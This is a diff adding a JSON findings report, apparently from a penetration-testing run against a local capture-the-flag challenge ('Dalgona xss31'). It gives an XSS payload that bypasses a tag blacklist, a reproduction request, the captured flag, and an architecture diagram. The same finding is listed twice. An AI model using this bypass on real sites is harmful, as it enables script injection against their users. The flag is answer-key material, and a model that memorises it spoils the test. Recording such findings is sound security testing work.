@@ -1,0 +1,48 @@
+{
+  "meta": {
+    "created": "2026-04-15T07:39:11.023277+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "f8846389-d763-49f3-8fda-a2ed7d8c9b6d",
+      "timestamp": "2026-04-15T07:39:11.023144+00:00",
+      "title": "XSS via Blacklist Bypass - Dalgona Challenge xss31",
+      "severity": "high",
+      "target": "http://172.17.0.1:53491/page",
+      "description": "The XSS filter uses a blacklist regex `r'<[a-yA-Y/]+'` which blocks HTML tags starting with letters a-y, but allows letter 'z'. Using `<z onfocus=alert('XSS') autofocus tabindex=0>` bypasses the filter and triggers XSS.",
+      "evidence": "flag{9541cc02-59a2-4171-8d30-5530ec31d825}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "manual",
+        "command": "GET http://172.17.0.1:53491/page?name=<z onfocus=alert('XSS') autofocus tabindex=0>",
+        "expected": "Response contains flag{9541cc02-59a2-4171-8d30-5530ec31d825}"
+      }
+    },
+    {
+      "id": "a2b23be8-9516-47a7-84b4-4013c23698a0",
+      "timestamp": "2026-04-15T07:39:11.065722+00:00",
+      "title": "XSS via Blacklist Bypass - Dalgona Challenge xss31",
+      "severity": "high",
+      "target": "http://172.17.0.1:53491/page",
+      "description": "The XSS filter uses a blacklist regex `r'<[a-yA-Y/]+'` which blocks HTML tags starting with letters a-y, but allows letter 'z'. Using `<z onfocus=alert('XSS') autofocus tabindex=0>` bypasses the filter and triggers XSS.",
+      "evidence": "flag{9541cc02-59a2-4171-8d30-5530ec31d825}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "manual",
+        "command": "GET http://172.17.0.1:53491/page?name=<z onfocus=alert('XSS') autofocus tabindex=0>",
+        "expected": "Response contains flag{9541cc02-59a2-4171-8d30-5530ec31d825}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "00eb464f-e7ce-49c9-b521-f4996ad2df18",
+      "timestamp": "2026-04-15T07:39:22.034083+00:00",
+      "title": "Dalgona XSS Challenge Architecture",
+      "mermaid": "graph TD\n    A[Browser] -->|GET /page?name=...| B[Flask App - app.py]\n    B -->|Blacklist Check| C{Regex: <[a-yA-Y/]+}\n    C -->|Matched| D[Block - \"Sorry, you can't use that tag\"]\n    C -->|No Match| E[Write page to static/*.html]\n    E --> F[check_browser.py - Headless Browser]\n    F -->|Execute JS| G{alert() triggered?}\n    G -->|Yes, alert('XSS')| H[Return flag from secret.txt]\n    G -->|Yes, alert(other)| I[Show error with alert content]\n    G -->|No| J[Failed - Try again]\n    H --> A\n    I --> A\n    J --> A\n\n    style C fill:#f99,stroke:#333\n    style H fill:#9f9,stroke:#333"
+    }
+  ]
+}
